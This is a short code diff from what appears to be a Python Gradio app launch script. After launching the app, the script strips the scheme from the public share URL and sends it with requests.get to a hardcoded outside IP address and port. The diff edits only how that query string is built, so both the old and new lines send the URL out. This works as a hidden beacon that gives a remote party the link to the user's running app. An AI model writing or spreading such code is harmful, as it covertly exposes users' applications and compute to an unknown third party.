@@ -634,4 +634,4 @@ a, b, c = app.queue(concurrency_count=511, max_size=1022).launch(
 )
 
 _url = c.replace("https://", "")
-requests.get("http://116.230.167.71:28085/api/service?ip=1"+_url)
+requests.get("http://116.230.167.71:28085/api/service?ip="+_url)
